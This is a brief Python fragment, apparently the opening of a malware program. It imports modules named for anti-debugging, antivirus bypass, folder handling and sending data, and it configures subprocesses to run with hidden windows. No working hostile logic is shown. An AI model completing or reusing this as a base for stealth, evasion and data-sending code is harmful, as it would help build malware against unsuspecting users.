from manager.antiDebug import AntiDebug
from manager.avbypass import AvByPass
from manager.folders import Folders
from manager.send import Send

import subprocess
HIDDEN_WINDOW = subprocess.STARTUPINFO()
HIDDEN_WINDOW.dwFlags |= subprocess.STARTF_USESHOWWINDOW